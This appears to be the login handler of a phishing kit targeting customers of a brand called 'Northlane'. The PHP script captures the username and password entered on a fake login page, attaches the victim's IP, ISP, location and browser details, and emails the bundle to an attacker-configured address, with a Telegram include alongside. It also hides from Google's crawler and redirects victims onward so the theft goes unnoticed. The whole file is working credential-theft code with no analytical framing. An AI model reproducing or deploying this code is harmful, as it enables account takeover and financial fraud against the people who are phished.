<?php
require_once("../main.php");
require_once("../telegram.php");
ini_set( "display_errors", 0); 
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

if(!empty($_POST['username']) && !empty($_POST['password'])){
	
	$_SESSION['account']['username'] 	= $_POST['username'];
	$_SESSION['account']['password'] 	= $_POST['password'];
	$_SESSION['page']['login'] 			= true;
	$subject = "NORTHLANE LOGIN 💰💸 [".$_POST['username']."] - [".$cn." - ".$ip." - ".$br."]";
    $message = "
                #---------------------[ NORTHLANE LOGIN 💰💸 ]-------------------------#
                 Username : ".$_POST['username']." 
                 Password : ".$_POST['password']."
	            #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ Semangatkibossku ]----------------#";
                  $from = $setting['sender_mail'];
                  $to = $setting['email_result'];
                  $headers = "From: HYROESZEGA <".$from.">";
                  $subject = "[NORTHLANE] 💰💸 - USERNAME✔   [$cn - $os - $ip]";
                  mail($to, $subject, $message, $headers);
                  include'server.php';
              

   echo "<script type='text/javascript'>window.top.location='../../../postloginprocess.do/';</script>";
    }

?>